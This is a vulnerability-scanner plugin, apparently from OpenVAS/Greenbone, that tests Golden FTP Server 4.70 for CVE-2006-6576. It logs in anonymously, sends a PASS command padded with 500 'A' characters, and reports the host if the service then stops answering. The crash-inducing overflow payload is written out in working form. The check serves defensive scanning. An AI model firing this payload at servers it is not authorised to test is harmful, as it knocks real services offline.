if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.802024" );
	script_version( "2020-08-24T08:40:10+0000" );
	script_tag( name: "last_modification", value: "2020-08-24 08:40:10 +0000 (Mon, 24 Aug 2020)" );
	script_tag( name: "creation_date", value: "2011-06-13 15:28:04 +0200 (Mon, 13 Jun 2011)" );
	script_cve_id( "CVE-2006-6576" );
	script_bugtraq_id( 45957, 45924 );
	script_tag( name: "cvss_base", value: "7.5" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:P/I:P/A:P" );
	script_name( "Golden FTP PASS Command Buffer Overflow Vulnerability" );
	script_category( ACT_DENIAL );
	script_copyright( "Copyright (C) 2011 Greenbone Networks GmbH" );
	script_family( "FTP" );
	script_dependencies( "ftpserver_detect_type_nd_version.sc" );
	script_require_ports( "Services/ftp", 21 );
	script_mandatory_keys( "ftp/golden_tfp/detected" );
	script_xref( name: "URL", value: "http://secunia.com/advisories/23323" );
	script_xref( name: "URL", value: "http://www.exploit-db.com/exploits/17355" );
	script_xref( name: "URL", value: "http://www.exploit-db.com/exploits/16036" );
	script_tag( name: "impact", value: "Successful exploitation will allow remote attackers to execute
  arbitrary code on the system or cause the application to crash." );
	script_tag( name: "affected", value: "Golden FTP Server Version 4.70, other versions may also be
  affected." );
	script_tag( name: "insight", value: "The flaw is due to format string error while parsing 'PASS'
  command, which can be exploited to crash the FTP service by sending 'PASS'
  command with an overly long username parameter." );
	script_tag( name: "solution", value: "No known solution was made available for at least one year since the disclosure
  of this vulnerability. Likely none will be provided anymore. General solution options are to upgrade to a newer
  release, disable respective features, remove the product or replace the product by another one." );
	script_tag( name: "summary", value: "The host is running Golden FTP Server and is prone to buffer
  overflow vulnerability." );
	script_tag( name: "qod_type", value: "remote_vul" );
	script_tag( name: "solution_type", value: "WillNotFix" );
	exit( 0 );
}
require("ftp_func.inc.sc");
require("misc_func.inc.sc");
require("port_service_func.inc.sc");
ftpPort = ftp_get_port( default: 21 );
banner = ftp_get_banner( port: ftpPort );
if(!banner || !ContainsString( banner, "Golden FTP Server" )){
	exit( 0 );
}
soc = open_sock_tcp( ftpPort );
if(!soc){
	exit( 0 );
}
resp = ftp_recv_line( socket: soc );
if(!resp || !ContainsString( resp, "220 Golden FTP Server" )){
	ftp_close( socket: soc );
	exit( 0 );
}
user_cmd = NASLString( "USER Anonymous", "\\r\\n" );
send( socket: soc, data: user_cmd );
resp = recv_line( socket: soc, length: 260 );
pass_cmd = NASLString( "PASS ", crap( data: "A", length: 500 ), "\\r\\n" );
send( socket: soc, data: pass_cmd );
resp = recv_line( socket: soc, length: 260 );
ftp_close( socket: soc );
sleep( 1 );
soc1 = open_sock_tcp( ftpPort );
if(!soc1){
	security_message( port: ftpPort );
	exit( 0 );
}
resp = ftp_recv_line( socket: soc );
if(!resp || !ContainsString( resp, "220 Golden FTP Server" )){
	security_message( port: ftpPort );
}
ftp_close( socket: soc1 );

